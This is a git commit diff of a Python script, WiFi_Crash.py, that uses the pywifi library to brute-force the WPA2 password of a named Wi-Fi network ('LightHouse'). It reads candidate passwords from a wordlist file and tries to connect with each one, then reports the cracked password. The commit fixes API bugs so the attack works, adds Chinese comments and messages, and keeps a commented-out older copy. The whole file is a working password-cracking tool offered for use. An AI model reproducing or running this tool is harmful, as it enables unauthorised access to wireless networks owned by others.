80e1cdbcdac0394e74cd5c11cdf3bca7014eedc4
Taoli93 <48353960+LEEJSLT@users.noreply.github.com>
2022-09-27 11:27:19 +0800

    Update WiFi_Crash.py

--- WiFi_Crash.py
+++ WiFi_Crash.py
@@ -3,60 +3,137 @@ from pywifi import const
 import time
 import datetime
 
+# def wifiConnect(pwd):
+#     wifi = pywifi.PyWiFi()
+#     ifaces = wifi.interfaces()[0]
+#     ifaces.disconnect()
+#     time.sleep(1)
+#     wifistatus = ifaces.status()
+#     if wifistatus == const.IFACE_DISCONNECTED:
+#         profile = pywifi.Profile()
+#         profile.ssid = "LightHouse"
+#         profile.auth = const.AUTH_ALG_OPEN
+#         profile.akm.append (const.AKM_TYPE_WPA2PSK)
+#         profile.cipher = const.CIPHER_TYPE_CCMP
+#         profile.key = pwd
+#         ifaces.remove_all_network_profiles()
+#         tep_profile = ifaces.add_network_profile(profile)
+#         ifaces.connect(tep_profile)
+#         time.sleep(2)
+#         if ifaces.status() == const.IFACE_CONNECTED:
+#             return True
+#         else:
+#             return False
+#     else:
+#         print ("WIFI already connected")
+
+# 测试连接，返回链接结果
 def wifiConnect(pwd):
+    print ("Arrive here")
+    # 抓取网卡接口
     wifi = pywifi.PyWiFi()
-    ifaces = wifi.interface()[0]
+    # 获取第一个无线网卡
+    ifaces = wifi.interfaces()[0]
+    # 断开所有连接
     ifaces.disconnect()
     time.sleep(1)
     wifistatus = ifaces.status()
-    if wifistatus == const.IFACE_DISCONNECTED:
+    print("wifi status", wifistatus)
+    print("const iface disconnect", const.IFACE_DISCONNECTED)
+    if wifistatus == const.IFACE_INACTIVE:
+        # 创建WiFi连接文件
+        print ("Jajajajajajajajajajajaja")
         profile = pywifi.Profile()
-        profile.ssid = "CMCC-vx94"
+        # 要连接WiFi的名称
+        profile.ssid = "LightHouse"
+        # 网卡的开放状态
         profile.auth = const.AUTH_ALG_OPEN
-        profile.akm.append (const.AKM_TYPE_WPA2PSK)
+        # wifi加密算法,一般wifi加密算法为wps
+        profile.akm.append(const.AKM_TYPE_WPA2PSK)
+        # 加密单元
         profile.cipher = const.CIPHER_TYPE_CCMP
+        # 调用密码
         profile.key = pwd
-        ifaces.removed_all_network_profiles()
+        # 删除所有连接过的wifi文件
+        ifaces.remove_all_network_profiles()
+        # 设定新的连接文件
         tep_profile = ifaces.add_network_profile(profile)
         ifaces.connect(tep_profile)
+        # wifi连接时间
         time.sleep(2)
         if ifaces.status() == const.IFACE_CONNECTED:
             return True
         else:
             return False
     else:
-        print ("WIFI already connected")
+        print("已有wifi连接")
 
 
+# def readPassword():
+#     success = False
+#     print("*********** WiFi Crack ****************")
+#     path = "pwd.txt"
+#     file = open (path, "r")
+#     start = datetime.datetime.now()
+#     print("hello")
 
+#     while True:
+#         try:
+#             pwd = file.readline()
+#             pwd = pwd.strip('\n')
+#             bool = wifiConnect(pwd)
+#             if bool:
+#                 print ("[*] Password crashed ", pwd)
+#                 print ("[*] Wi-Fi connected!!!")
+#                 success = True
+#                 break
+#             else:
+#                 print ("working hard on it")
+#         except:
+#             continue
+#     end = datetime.datetime.now()
+#     if (success):
+#         print("job is done with: {}".format(end - start))
+#     else:
+#         print("cannot complete")
+#     exit (0)
 
+# if __name__=="__main__":
+#     readPassword()
+
+    # 读取密码本
 def readPassword():
     success = False
-    print("*********** WiFi Crack ****************")
+    print("****************** WIFI破解 ******************")
+    # 密码本路径
     path = "pwd.txt"
-    file = open (path, "r")
+    # 打开文件
+    file = open(path, "r")
     start = datetime.datetime.now()
-
     while True:
         try:
             pwd = file.readline()
+            # 去除密码的末尾换行符
             pwd = pwd.strip('\n')
             bool = wifiConnect(pwd)
+            # print ("haha", bool)
             if bool:
-                print ("[*] Password crashed ", pwd)
-                print ("[*] Wi-Fi connected!!!")
+                print("[*] 密码已破解：", pwd)
+                print("[*] WiFi已自动连接！！！")
                 success = True
                 break
             else:
-                print ("working hard on it")
+                # 跳出当前循环，进行下一次循环
+                print("正在破解 SSID 为 %s 的 WIFI密码，当前校验的密码为：%s"%("LightHouse",pwd))
         except:
             continue
     end = datetime.datetime.now()
-    if (success):
-        print("job is done with: {}".format(end - start))
+    if(success):
+        print("[*] 本次破解WIFI密码一共用了多长时间：{}".format(end - start))
     else:
-        print("cannot complete")
-    exit (0)
+        print("[*] 很遗憾未能帮你破解出当前指定WIFI的密码，请更换密码字典后重新尝试！")
+    exit(0)
+
 
 if __name__=="__main__":
     readPassword()
